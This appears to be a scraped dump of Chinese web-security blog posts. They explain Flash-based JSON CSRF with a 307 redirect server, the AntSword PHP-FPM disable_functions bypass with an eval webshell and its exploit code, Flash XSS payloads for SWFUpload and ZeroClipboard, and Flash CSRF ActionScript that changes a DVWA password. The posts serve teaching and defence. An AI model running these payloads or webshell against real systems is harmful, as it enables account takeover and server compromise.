RedirectHandler(BaseHTTPServer.BaseHTTPRequestHandler): def do_POST(s): # dir(s) if s.path == '/csrf.swf': s.send_response(200) s.send_header(\"Content-Type\",\"application/x-shockwave-flash\") s.end_headers() s.wfile.write(open(\"csrf.swf\", \"rb\").read()) return s.send_response(307) s.send_header(\"Location\", \"https://victim-site/userdelete\") s.end_headers() def do_GET(s): print(s.path) s.do_POST() if __name__ == '__main__': server_class = BaseHTTPServer.HTTPServer httpd = server_class((HOST, PORT), RedirectHandler) print time.asctime(), \"Server Starts - %s:%s\" % (HOST, PORT) try: httpd.serve_forever() except KeyboardInterrupt: pass httpd.server_close() print time.asctime(), \"Server Stops - %s:%s\" % (HOST, PORT) crossdomain.xml 这个文件是否需要看情况：当Flash文件和307跳转文件同域，则无需该文件；若两个文件不同域，为了使Flash文件能够成功跨域访问，则需要攻击者在307跳转文件所在的Web服务器上放置crossdomain.xml并设置允许Flash文件所在的域能够访问，如： 1234&lt;cross-domain-policy&gt;&lt;allow-access-from domain=\"*\" secure=\"false\"/&gt;&lt;allow-http-request-headers-from domain=\"*\" headers=\"*\" secure=\"false\"/&gt;&lt;/cross-domain-policy&gt; 利用过程借个FreeBuf上的图： 用户在浏览器中登录http://victim-site/ 用户被重定向到http://attacker-ip:8000/csrf.swf Flash文件加载成功，并向http://attacker-ip:8000/发送带有自定义Header的POST Payload。 攻击者的服务器发送HTTP 307重定向，这样便能让POST响应body和自定义HTTP头按原样发送到http://victim-site/ 目标用户刷新自己的http://victim-site/页面，并发现自己的帐户已经被删除了 案例可参考：http://www.0xby.com/902.html 0x04 工具现成美好的轮子已经很多了，无需我们自己再造了，下面是个人收集的两个。 Python起的Web服务，包括307文件都在一个Web服务中，理解原理可参考这个构造payload： https://github.com/appsecco/json-flash-csrf-poc 更全面的工具，包括显示界面等HTML文件，PHP文件实现的307跳转功能： https://github.com/sp1d3r/swf_json_csrf/ 0x05 防御方法Json CSRF还是CSRF漏洞，采用CSRF通用防御即可成功防御。 主要有 5 种策略：验证 HTTP的Referer字段、在请求地址中添加 token 并验证、在 HTTP 头中自定义属性并验证、使用POST替代GET等。 （1）、验证 HTTP的Referer字段，在 HTTP 头的Referer字段记录了该 HTTP 请求的来源地址。顺便解决了非法盗链、站外提交等问题。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。 （2）、在请求地址中添加 token 并验证，可以在 HTTP请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。抵御 CSRF 攻击的关键在于：在请求中加入攻击者所不能伪造的信息，并且该信息不存在于 Cookie 之中。 （3）、在 HTTP 头中自定义属性并验证，也是使用 token 并进行验证，但并不是把 token以参数的形式置于 HTTP 请求而是放到 HTTP 头中自定义的属性里。通过XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把token 值放入其中。这样解决了前一种方法在请求中加入 token 的不便，同时，通过这个类请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会通过 Referer 泄露到其他网站。 （4）、严格区分好 POST 与 GET 的数据请求，尽量使用POST来替代GET，如在 asp 中不要使用 Request 来直接获取数据。同时建议不要用 GET 请求来执行持久性操作。 （5）、使用验证码或者密码确认方式，缺点是用户体验差。 0x06 参考如何在JSON端点上利用CSRF漏洞 通过挖掘某某 src 来学习 json csrf [译] 使用 Flash 进行 JSON CSRF 攻击 JSON CSRF的一个案例-附利用链接","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"CSRF","slug":"CSRF","permalink":"https://www.mi1k7ea.com/tags/CSRF/"},{"name":"Flash","slug":"Flash","permalink":"https://www.mi1k7ea.com/tags/Flash/"}]},{"title":"从蚁剑插件看利用PHP-FPM绕过disable_functions","date":"2019-08-03T04:11:46.000Z","path":"2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/","text":"0x01 环境准备与插件使用这是蚁剑上的一个disable_functions项目：https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/5 Docker部署非常方便，文档也说明了如何用蚁剑的插件来Bypass disable_functions。本次示例的插件适用于PHP-FPM/FCGI 监听在 unix socket 或者 tcp socket 上时使用。常见的比如：nginx + fpm。 题目直接就是个WebShell： 1234&lt;?php@eval($_REQUEST['ant']);show_source(__FILE__);?&gt; 查看phpinfo，看到服务器中PHP是用FPM/FastCGI的连接模式启动的： 其中open_basedir未设置，而disable_functions设置如下： 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv 可看到，命令执行函数、mail()、putenv()、dl()等经常用来绕过disable_functions的函数都被禁用掉了。 用蚁剑直接连接看看，Web根目录下有两个php，代码是一样的： 切到虚拟终端，命令执行不成功： 后面就添加插件再试试。先去插件市场下载安装绕过disable_functions插件，然后加载进来，选择PHP-FPM/FastCGI模式进行，FPM地址根据需要自行查找配置文件，然后点击开始即可： 操作成功后，会显示成功上传代理脚本和一个so文件，在Web根目录下会多了个.antproxy.php文件，我们添加副本改为该代理PHP文件即可成功Bypass disable_functions： 下面我们探究下这个插件的原理。 0x02 原理分析简单地说，就是利用WebShell去连接本地的PHP-FPM端口搞事情，让其另起一个不以php.ini为配置的PHP程序，然后通过连接上传的代理文件直接绕过了原本的PHP程序，从而绕过disable_functions的限制。 .antproxy.php分析看下.antproxy.php中的代码，向本地监听的63611端口的index.php发送请求： 12345&lt;?php set_time_limit(120); $aAccess = curl_init(); curl_setopt($aAccess, CURLOPT_URL, \"http://127.0.0.1:63611/index.php?\".$_SERVER['QUERY_STRING']); ... 我们在目标服务器执行netstat看看是不是开启了63611端口的监听： 确实开启了，那这个端口到底属于哪个进程的呢？我们直接ps命令看看： 可以看到，启用的程序的命令为： 1php -n -S 127.0.0.1:63611 -t /var/www/html 解释一下里面的几个参数： -S 127.0.0.1:63611：新Web服务的监听地址； -t /var/www/html/：新HTTP服务的Web根目录，可随便指，只要保证那个目录下面有个PHP WebShell就行，建议是直接指定成Shell当前目录； -n：表示不使用php.ini，这个新的服务PHP用的是默认配置，是核心所在，从而根本不受php.ini中disable_functions的影响，当使用代理连接到该PHP服务时也就实现Bypass了； 插件源码分析我们看下蚁剑绕过disable_functions的插件的主要代码，代码在：https://github.com/Medicean/as_bypass_php_disable_functions/blob/7d28318c5f0a795dc96bda95e37d04a05b5bf2a2/core/php_fpm/index.js 这里我们直接看exploit()函数，这里插件exp编写的地方： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131// 执行EXP, 必须有这个函数exploit() &#123; let self = this; let fpm_host = ''; let fpm_port = -1; let port = Math.floor(Math.random() * 5000) + 60000; // 60000~65000 if (self.form.validate()) &#123; self.cell.progressOn(); let core = self.top.core; let formvals = self.form.getValues(); let phpbinary = formvals['phpbinary']; formvals['fpm_addr'] = formvals['fpm_addr'].toLowerCase(); if (formvals['fpm_addr'].startsWith('unix:')) &#123; fpm_host = formvals['fpm_addr']; &#125; else if (formvals['fpm_addr'].startsWith('/')) &#123; fpm_host = `unix://$&#123;formvals['fpm_addr']&#125;` &#125; else &#123; fpm_host = formvals['fpm_addr'].split(':')[0] || ''; fpm_port = parseInt(formvals['fpm_addr'].split(':')[1]) || 0; &#125; // 生成 ext let wdir = \"\"; if (self.isOpenBasedir) &#123; for (var v in self.top.infodata.open_basedir) &#123; if (self.top.infodata.open_basedir[v] == 1) &#123; if (v == self.top.infodata.phpself) &#123; wdir = v; &#125; else &#123; wdir = v; &#125; break; &#125; &#125;; &#125; else &#123; wdir = self.top.infodata.temp_dir; &#125; let cmd = `$&#123;phpbinary&#125; -n -S 127.0.0.1:$&#123;port&#125; -t $&#123;self.top.infodata.phpself&#125;`; let fileBuffer = self.generateExt(cmd); if (!fileBuffer) &#123; toastr.warning(PHP_FPM_LANG['msg']['genext_err'], LANG_T[\"warning\"]); self.cell.progressOff(); return &#125; new Promise((res, rej) =&gt; &#123; var ext_path = `$&#123;wdir&#125;/.$&#123;String(Math.random()).substr(2, 5)&#125;$&#123;self.ext_name&#125;`; // 上传 ext core.request( core.filemanager.upload_file(&#123; path: ext_path, content: fileBuffer &#125;) ).then((response) =&gt; &#123; var ret = response['text']; if (ret === '1') &#123; toastr.success(`Upload extension $&#123;ext_path&#125; success.`, LANG_T['success']); res(ext_path); &#125; else &#123; rej(\"upload extension fail\"); &#125; &#125;).catch((err) =&gt; &#123; rej(err) &#125;); &#125;).then((p) =&gt; &#123; // 触发 payload, 会超时 var payload = `$&#123;FastCgiClient()&#125;; $content=\"\"; $client = new Client('$&#123;fpm_host&#125;',$&#123;fpm_port&#125;); $client-&gt;request(array( 'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0', 'REQUEST_METHOD' =&gt; 'POST', 'SERVER_SOFTWARE' =&gt; 'php/fcgiclient', 'REMOTE_ADDR' =&gt; '127.0.0.1', 'REMOTE_PORT' =&gt; '9984', 'SERVER_ADDR' =&gt; '127.0.0.1', 'SERVER_PORT' =&gt; '80', 'SERVER_NAME' =&gt; 'mag-tured', 'SERVER_PROTOCOL' =&gt; 'HTTP/1.1', 'CONTENT_TYPE' =&gt; 'application/x-www-form-urlencoded', 'PHP_VALUE' =&gt; 'extension=$&#123;p&#125;', 'PHP_ADMIN_VALUE' =&gt; 'extension=$&#123;p&#125;', 'CONTENT_LENGTH' =&gt; strlen($content) ), $content ); sleep(1); echo(1); `; core.request(&#123; _: payload, &#125;).then((response) =&gt; &#123; &#125;).catch((err) =&gt; &#123; // 超时也是正常 &#125;) &#125;).then(() =&gt; &#123; // 验证是否成功开启 var payload = `sleep(1); $fp = @fsockopen(\"127.0.0.1\", $&#123;port&#125;, $errno, $errstr, 1); if(!$fp)&#123; echo(0); &#125;else&#123; echo(1); @fclose($fp); &#125;;` core.request(&#123; _: payload, &#125;).then((response) =&gt; &#123; var ret = response['text']; if (ret === '1') &#123; toastr.success(LANG['success'], LANG_T['success']); self.uploadProxyScript(\"127.0.0.1\", port); self.cell.progressOff(); &#125; else &#123; self.cell.progressOff(); throw (\"exploit fail\"); &#125; &#125;).catch((err) =&gt; &#123; self.cell.progressOff(); toastr.error(`$&#123;LANG['error']&#125;: $&#123;JSON.stringify(err)&#125;`, LANG_T['error']); &#125;) &#125;).catch((err) =&gt; &#123; self.cell.progressOff(); toastr.error(`$&#123;LANG['error']&#125;: $&#123;JSON.stringify(err)&#125;`, LANG_T['error']); &#125;); &#125; else &#123; self.cell.progressOff(); toastr.warning(LANG['form_not_comp'], LANG_T[\"warning\"]); &#125; return;&#125; 其中generateExt()函数的定义在Base.js中： 12345678910111213141516171819202122232425262728293031323334// 生成扩展generateExt(cmd) &#123; let self = this; let fileBuff = fs.readFileSync(self.ext_path); let start = 0, end = 0; switch (self.ext_name) &#123; case 'ant_x86.so': start = 275; end = 504; break; case 'ant_x64.so': // 434-665 start = 434; end = 665; break; case 'ant_x86.dll': start = 1544; end = 1683; break; case 'ant_x64.dll': start = 1552; end = 1691; break; default: break; &#125; if(cmd.length &gt; (end - start)) &#123; return &#125; fileBuff[end] = 0; fileBuff.write(\" \", start); fileBuff.write(cmd, start); return fileBuff;&#125; 简单说下过程： 随机生成一个端口号，作为后续新起的PHP服务的端口； 判断当前PHP-FPM为TCP模式或Unix Socket模式来据此获得FPM地址和端口，用于后面和服务器中FPM服务的访问； 以拼接组成的用于启动新PHP服务的命令的cmd变量为参数，调用generateExt()生成扩展，将cmd内容插入到指定范围内去； 将扩展命名为.xxxxxant_x64.so并上传； 上传成功后，构造并触发payload：先初始化FastCgi客户端，再构造连接服务端PHP-FPM服务的fastcgi协议包、指定PHP_VALUE和PHP_ADMIN_VALUE为上传的扩展文件，最后向目标服务端PHP-FPM服务发送该fastcgi协议请求包，目的是加载执行上传的ext文件、从而新起一个PHP进程； 最后尝试连接本地前面随机生成的端口号，确认payload是否触发成功，若OK则上传代理脚本； .69773ant_x64.so分析从前面的代码中的generateExt()函数知道，是直接对二进制数据操作，在start到end中填入cmd。 这里我们将该so文件下载下来，本想逆向看下给出的几个基础框架文件是怎么写的，但是因为so文件格式不对无法用ida直接看.69773ant_x64.so文件，所以这里是用ida打开的Windows版本的ant_x64.dll文件进行查看分析： 可以看到，构造很简单，只有一个函数用于调用执行system()，而start和end区域（ant_x64.dll为1552~1691）就是system()函数内参数的区域，直接往里写就能执行恶意命令，简单粗暴： 这里我们也用WinHex打开.69773ant_x64.so（434~665）文件查看对应区域的内容，确实填充的是新起PHP服务的命令： 0x03 小结若目标站点是使用PHP-FPM的方式启动PHP服务的，且存在WebShell文件、开启了disable_functions限制了包括putenv()等函数及未设置open_basedir，则我们可以通过这种方式进行Bypass： 编写恶意的so/dll文件，其中调用system()函数执行类似于php -n -S 127.0.0.1:63611 -t /var/www/html的命令，用于以php命令新启动一个Web服务；通过WebShell上传该恶意so文件到目标服务器中如tmp目录中；通过PHP代码执行建立FastCgi客户端和目标服务器内部的PHP-FPM进行通信，伪造FastCgi协议包并设置PHP_VALUE和PHP_ADMIN_VALUE为上传的so文件从而可以加载执行该恶意so文件；最后通过WebShell上传代理新起Web服务的PHP文件即可。 一个小问题 既然我们上传的ext文件可以通过攻击PHP-FPM的方式来执行命令，为何还要新起一个PHP服务呢？ 这个本人还没细究，但可以看下参考文章最后补充的回复。 0x04 参考蚁剑disable_functions研究 用WebShell攻击PHP-FPM","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"SWFUpload.swf的Flash型XSS分析","date":"2019-07-31T13:35:24.000Z","path":"2019/07/31/SWFUpload-swf的Flash型XSS分析/","text":"0x01 SWFUpload简介SWFUpload是一个客户端文件上传工具，最初由Vinterwebb.se开发，它通过整合Flash与JavaScript技术为Web开发者提供了一个具有丰富功能继而超越传统标签的文件上传模式。 SWFUpload是在国内网站中使用得比较普遍的Flash插件。 0x02 Flash XSS当SWFUpload的版本&lt;= 时，会存在Flash XSS漏洞。 漏洞版本下载地址：https://github.com/JoyChou93/FlashXss/tree/master/swfupload 将文件下载下来后，反编译得到as源代码，可以看到脚本是有三个，这里先关注SWFUpload的代码： SWFUpload的代码量略大，这里直接搜索外部参数输入的关键字，找到对应的代码： 12345678910111213141516171819202122public function SWFUpload() &#123; ... this.movieName = root.loaderInfo.parameters.movieName; this.flashReady_Callback = &quot;SWFUpload.instances[\\&quot;&quot; + this.movieName + &quot;\\&quot;].flashReady&quot;; this.fileDialogStart_Callback = &quot;SWFUpload.instances[\\&quot;&quot; + this.movieName + &quot;\\&quot;].fileDialogStart&quot;; this.fileQueued_Callback = &quot;SWFUpload.instances[\\&quot;&quot; + this.movieName + &quot;\\&quot;].fileQueued&quot;; this.fileQueueError_Callback = &quot;SWFUpload.instances[\\&quot;&quot; + this.movieName + &quot;\\&quot;].fileQueueError&quot;; this.fileDialogComplete_Callback = &quot;SWFUpload.instances[\\&quot;&quot; + this.movieName + &quot;\\&quot;].fileDialogComplete&quot;; this.uploadStart_Callback = &quot;SWFUpload.instances[\\&quot;&quot; + this.movieName + &quot;\\&quot;].uploadStart&quot;; this.uploadProgress_Callback = &quot;SWFUpload.instances[\\&quot;&quot; + this.movieName + &quot;\\&quot;].uploadProgress&quot;; this.uploadError_Callback = &quot;SWFUpload.instances[\\&quot;&quot; + this.movieName + &quot;\\&quot;].uploadError&quot;; this.uploadSuccess_Callback = &quot;SWFUpload.instances[\\&quot;&quot; + this.movieName + &quot;\\&quot;].uploadSuccess&quot;; this.uploadComplete_Callback = &quot;SWFUpload.instances[\\&quot;&quot; + this.movieName + &quot;\\&quot;].uploadComplete&quot;; this.debug_Callback = &quot;SWFUpload.instances[\\&quot;&quot; + this.movieName + &quot;\\&quot;].debug&quot;; this.testExternalInterface_Callback = &quot;SWFUpload.instances[\\&quot;&quot; + this.movieName + &quot;\\&quot;].testExternalInterface&quot;; this.cleanUp_Callback = &quot;SWFUpload.instances[\\&quot;&quot; + this.movieName + &quot;\\&quot;].cleanUp&quot;; this.uploadURL = root.loaderInfo.parameters.uploadURL; this.filePostName = root.loaderInfo.parameters.filePostName; this.fileTypes = root.loaderInfo.parameters.fileTypes; this.fileTypesDescription = root.loaderInfo.parameters.fileTypesDescription + &quot; (&quot; + this.fileTypes + &quot;)&quot;; this.loadPostParams(root.loaderInfo.parameters.params); 这里看到好几个变量都是外界可控的，有一个很特别，就是movieName变量，它会被拼接到很多名为xx_Callback的变量值中。我们就跟踪下第一个名为flashReady_Callback变量看看是不是可调用的： 12345if(ExternalCall.Bool(this.testExternalInterface_Callback))&#123; ExternalCall.Simple(this.flashReady_Callback); this.hasCalledFlashReady = true;&#125; 可以看到，在后面的代码中会作为ExternalCall.Simple()函数的唯一参数传入调用。 而ExternalCall.Simple()函数的定义是在另一个名为ExternalCall脚本中，我们到其中搜索看看： bingo，是ExternalInterface.call()函数，且是第一个参数外部可控，妥妥的Flash XSS漏洞。 理下思路，存在AS3形式的loaderInfo.parameters来传入外部参数movieName，且存在ExternalInterface.call()函数的第一个参数外部可控，结合导致Flash XSS。 至于其他几个拼接的变量也是一样的分析。 这里结合ExternalInterface.call()函数的第一个参数的payload的形式，稍微修改下来闭合前面拼接的格式即可： 1?movieName=&quot;])&#125;catch(e)&#123;alert(&apos;mi1k7ea&apos;)&#125;;// 接着就是不停地弹框了： 在IE下调试，可以看到底层被恶意构造输入注入的执行的JS代码： 0x03 参考Flash XSS检测脚本的简单实现","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"XSS","slug":"XSS","permalink":"https://www.mi1k7ea.com/tags/XSS/"},{"name":"Flash","slug":"Flash","permalink":"https://www.mi1k7ea.com/tags/Flash/"}]},{"title":"ZeroClipboard.swf的Flash型XSS分析","date":"2019-07-30T14:05:19.000Z","path":"2019/07/30/ZeroClipboard-swf的Flash型XSS分析/","text":"0x01 ZeroClipboard简介ZeroClipboard是一款基于Flash的，兼容性较强的用于剪贴板复制的JS插件，它是基于Flash来实现跨浏览器的复制功能的。 ZeroClipboard是在国内网站中使用得比较普遍的Flash插件。 0x02 Flash XSS分析当ZeroClipboard的版本&lt;=1.0.7时，会存在Flash XSS漏洞。 漏洞版本下载地址：https://github.com/JoyChou93/FlashXss/tree/master/ZeroClipboard 我们下载了ZeroClipboard.swf文件后，使用FFDec软件来对其进行反编译，得到as代码： 得到如下as源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374package&#123; import flash.display.LoaderInfo; import flash.display.Sprite; import flash.display.StageScaleMode; import flash.events.Event; import flash.events.MouseEvent; import flash.external.ExternalInterface; import flash.system.Security; import flash.system.System; public class ZeroClipboard extends Sprite &#123; private var button:Sprite; private var id:String = &quot;&quot;; private var clipText:String = &quot;&quot;; public function ZeroClipboard() &#123; super(); stage.scaleMode = StageScaleMode.EXACT_FIT; Security.allowDomain(&quot;*&quot;); var flashvars:Object = LoaderInfo(this.root.loaderInfo).parameters; id = flashvars.id; button = new Sprite(); button.buttonMode = true; button.useHandCursor = true; button.graphics.beginFill(13434624); button.graphics.drawRect(0,0,Math.floor(flashvars.width),Math.floor(flashvars.height)); button.alpha = 0; addChild(button); button.addEventListener(MouseEvent.CLICK,clickHandler); button.addEventListener(MouseEvent.MOUSE_OVER,function(param1:Event):* &#123; ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseOver&quot;,null); &#125;); button.addEventListener(MouseEvent.MOUSE_OUT,function(param1:Event):* &#123; ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseOut&quot;,null); &#125;); button.addEventListener(MouseEvent.MOUSE_DOWN,function(param1:Event):* &#123; ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseDown&quot;,null); &#125;); button.addEventListener(MouseEvent.MOUSE_UP,function(param1:Event):* &#123; ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseUp&quot;,null); &#125;); ExternalInterface.addCallback(&quot;setHandCursor&quot;,setHandCursor); ExternalInterface.addCallback(&quot;setText&quot;,setText); ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;load&quot;,null); &#125; public function setHandCursor(param1:Boolean) : * &#123; button.useHandCursor = param1; &#125; private function clickHandler(param1:Event) : void &#123; System.setClipboard(clipText); ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;complete&quot;,clipText); &#125; public function setText(param1:*) : * &#123; clipText = param1; &#125; &#125;&#125; 关注重点放在ZeroClipboard()函数上。 接着，我们搜索是否存在有接受外部输入参数的关键字，这里我们找到了AS3的传参语句： 1var flashvars:Object = LoaderInfo(this.root.loaderInfo).parameters; 跟踪下去，看看获取到传入的参数值的flashvars变量的调用链： 123id = flashvars.id;button = new Sprite();... button.graphics.drawRect(0,0,Math.floor(flashvars.width),Math.floor(flashvars.height)); 可以看到，分别有id、width和height三个参数可以控制。传入参数id赋给了id变量，而其它两个参数则传入创建button按钮的宽和高，若不传的话会创建失败、无法执行到后续的代码逻辑中去。 这里继续跟踪id变量，可以看到都是作为ExternalInterface.call()函数的第二个参数传入的，当button成功创建并添加了一些监听事件后，在鼠标移动时就会触发且最后还会调用触发一次，此时就导致了Flash XSS漏洞的存在： 12345678910111213141516171819button.addEventListener(MouseEvent.MOUSE_OVER,function(param1:Event):*&#123; ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseOver&quot;,null);&#125;);button.addEventListener(MouseEvent.MOUSE_OUT,function(param1:Event):*&#123; ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseOut&quot;,null);&#125;);button.addEventListener(MouseEvent.MOUSE_DOWN,function(param1:Event):*&#123; ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseDown&quot;,null);&#125;);button.addEventListener(MouseEvent.MOUSE_UP,function(param1:Event):*&#123; ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;mouseUp&quot;,null);&#125;);ExternalInterface.addCallback(&quot;setHandCursor&quot;,setHandCursor);ExternalInterface.addCallback(&quot;setText&quot;,setText);ExternalInterface.call(&quot;ZeroClipboard.dispatch&quot;,id,&quot;load&quot;,null); 好了，最后理下，就是通过loaderInfo.parameters，我们可以传入三个参数id、width和height；其中width和height是必须传入的，否则进不了后续的代码逻辑；id参数则直接传入到ExternalInterface.call()函数的第二个参数执行，导致了Flash XSS漏洞的存在。 结合ExternalInterface.call()函数的第二个参数可控的payload，直接构造输入如下payload即可成功触发Flash XSS： 1?id=\\&quot;))&#125;catch(e)&#123;alert(&apos;mi1k7ea&apos;);&#125;//&amp;width=100&amp;height=100 这里只要你移动鼠标就会触发： 用IE的开发者工具调试可以看到实际执行JS代码如下，注入的内容成功闭合了后面的语句，造成XSS： 1try &#123; __flash__toXML(ZeroClipboard.dispatch(&quot;\\\\&quot;))&#125;catch(e)&#123;alert(&apos;mi1k7ea&apos;);&#125;//&quot;,&quot;mouseOut&quot;,null)) ; &#125; catch (e) &#123; &quot;&lt;undefined/&gt;&quot;; &#125; 这里多说一句，如果payload写成如下是不成功的： 1?id=\\&quot;));alert(&apos;mi1k7ea&apos;);&#125;catch(e)&#123;&#125;//&amp;width=100&amp;height=100 这是因为ZeroClipboard未定义，在之前alert前就会报错直接跳转到了catch代码段中执行，绕过了我们注入的XSS payload： 0x03 参考Flash XSS Securit","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"XSS","slug":"XSS","permalink":"https://www.mi1k7ea.com/tags/XSS/"},{"name":"Flash","slug":"Flash","permalink":"https://www.mi1k7ea.com/tags/Flash/"}]},{"title":"Flash型CSRF总结","date":"2019-07-28T06:45:15.000Z","path":"2019/07/28/Flash型CSRF总结/","text":"0x01 基本原理Flash功能丰富，我们可以使用其API来向任意站点发送请求，而且发送的请求会继承当前浏览器的会话。换句话说，我们可以利用Flash而非JavaScript来控制浏览器向目标URL发送请求，从而实现Flash CSRF攻击。 我们知道，通过Flash请求外部资源时，会先访问外域是否存在crossdomain.xml且判断Flash当前域是否在allow-access-from标签配置的domain内。当domain的值为通配符*时，表明该站资源对所有外域开放，等同于舍弃了Flash层面的同源策略的限制。 Flash CSRF在于：如果目标站点的crossdomain.xml中domain值为*或者其中某些domain下的站可被攻击者利用来上传Flash文件等，那么攻击者可以诱使受害者用户访问攻击页面，进而通过触发Flash请求某个用户当前浏览器已登录的页面，从中提取出CSRF的token或者页面的其他敏感信息，造成CSRF攻击。 0x02 攻击场景使用Flash来发起CSRF攻击，一般用于绕过一些特定情形，下面就列两个常见的。 场景1——绕过Referer等HTTP头字段检测很多时候，Web站点后台会对Referer字段进行校验，但是有时候会出现未校验无Referer字段等情况的缺陷。 用Flash发起的CSRF，可以去掉HTTP头中的Referer字段，从而可以绕过校验Referer字段（但未校验空Referer）来防御CSRF攻击的机制。除此之外，还能去掉Origin字段。 攻击原理和CSRF一样的，只不过从经典的伪造表单变成了触发swf文件的形式： 攻击者编写恶意的Flash文件，用于从目标敏感页面中获取受害者的敏感信息或者获取页面的token值； 攻击者将该Flash文件上传至自己的服务器中，并诱使受害者访问加载该恶意Flash文件的页面； 受害者访问目标敏感页面后，在同一浏览器中被诱使访问攻击者服务器加载了恶意Flash文件的页面，此时的访问是会带上受害者在目标页面的会话的； 由于无Referer字段，Bypass了目标站点后台的CSRF防御机制，成功获取到页面token或用户敏感信息，实现了CSRF攻击； 下面举两个不同方式的Demo。 GET方式首先攻击者发现目标站点的crossdomain.xml存在Flash型CSRF风险： 1234&lt;?xml version=\"1.0\"?&gt;&lt;cross-domain-policy&gt;&lt;allow-access-from domain=\"*\"/&gt;&lt;/cross-domain-policy&gt; 然后攻击者编写恶意Flash，用于在目标页面进行危险敏感的GET操作： 12345678910function CSRF():void&#123; var urlLoader:URLLoader=new URLLoader(); var request:URLRequest=new URLRequest(); request.url=&quot;http://a.com/m7.php&quot;; request.method=URLRequestMethod.GET; request.data=&quot;user=admin&amp;msg=GET_secret_content&quot;; urlLoader.load(request); &#125;CSRF(); 编译为swf文件后放置到攻击者的Web目录，然后诱使受害者访问，即可向目标站点通过GET方式带上受害者当前访问该页面的浏览器会话来发送敏感操作的请求： POST方式123456789import flash.net.URLRequest;import flash.system.Security;var url = new URLRequest(&quot;http://a.com/m7.php&quot;);var shellcode = new URLVariables();shellcode = &quot;user=admin&amp;msg=POST_hacker_content&quot;;url.method = &quot;POST&quot;;url.data = shellcode;sendToURL(url);stop(); 诱使受害者访问攻击者的页面后，触发Flash向目标页面发起POST请求，进行危险的操作： 可以明显看到，请求报文并没有Referer字段。 场景2——上传Flash到目标站点绕过crossdomain有个知识点——Flash并不关心扩展名或者Content-Type。如果使用object标签嵌入文件，只要文件内容为有效的Flash文件，它就会被当作是Flash文件来执行。 简单说下利用过程： 攻击者发现目标站点的crossdomain.xml中domain设置并不为*，而是几个其他域名； 攻击者搜索几个白名单域名中的子域名，寻找可上传文件的域名，如victim.com中允许上传图片文件，但校验了文件后缀名和Content-Type； 攻击者创建恶意Flash文件，并修改后缀名为jpg，然后通过篡改Content-Type将其上传到victim.com中； 获取到上传文件的地址后，攻击者使用类型为application/x-shockwave-flash的object标签将文件嵌入到攻击者服务器中，如attacker.com； 受害者访问了victim.com，然后在同一浏览器中被诱使访问attacker.com，触发了攻击者上传的恶意Flash，从而可使攻击者窃取CSRF的token或目标站点页面的敏感信息，实现CSRF攻击； 类似的payload如下： 1&lt;object style = \"height ：1px ; width ：1px ; \" data = \"http://victim.com/user/2292/profilepicture.jpg\" type = \"application / x-shockwave-flash\" allowscriptaccess = \"always\" flashvars = \"c = read＆u = http://victim.com/secret_file.txt\" &gt; &lt;/object&gt; 实际攻击利用案例可直接看如下链接，该作者发现了Paypal的Flash CSRF漏洞并在YouTube上进行了漏洞利用的演示： https://blog.h3xstream.com/2015/04/crossdomainxml-beware-of-wildcards.html 0x03 攻击案例下面以DVWA的Low级和High级的场景为例进行Flash CSRF的攻击利用。 GET型无Anti-CSRF token我们知道，Low级的场景非常简单，表单参数通过GET方式传入，无CSRF-token防御机制，也无校验当前密码： 首先，我们查看到目标站点是存在crossdomain.xml文件的，且domain设置为*，明显存在Flash CSRF风险： 接着，我们根据前面看到的表单将前面场景1中的GET方式的代码稍微改下即可： 12345678910function CSRF():void&#123; var urlLoader:URLLoader=new URLLoader(); var request:URLRequest=new URLRequest(); request.url=&quot;http://a.com/dvwa/vulnerabilities/csrf/index.php&quot;; request.method=URLRequestMethod.GET; request.data=&quot;password_new=hacker&amp;password_conf=hacker&amp;Change=Change&quot;; urlLoader.load(request); &#125;CSRF(); 编译成swf文件后，放置到我们自己的服务器中，然后诱使受害者访问我们的恶意swf文件；如果受害者在此之前在同一浏览器中登录了目标站点，那么就会成功触发Flash CSRF攻击，从而密码被篡改： 